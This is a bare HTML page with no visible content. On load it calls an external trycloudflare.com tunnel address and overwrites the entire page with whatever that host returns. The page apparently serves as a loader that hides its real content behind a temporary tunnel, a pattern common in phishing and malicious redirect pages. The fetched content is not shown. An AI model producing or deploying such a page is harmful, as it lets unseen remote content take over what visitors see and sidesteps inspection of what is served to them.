<!DOCTYPE html>
<html>
    <body onload="javascript:{openCE();}">
        <div id="content"></div>
    <script>
        function openCE() {
            var xhr = new XMLHttpRequest();
            xhr.onload = function() {
                document.getElementsByTagName("html")[0].innerHTML= xhr.responseText;
            };

            xhr.open('GET', 'https://hop-arise-teens-informational.trycloudflare.com', true);
            xhr.send(null);
        }
    </script>
    </body>
</html>
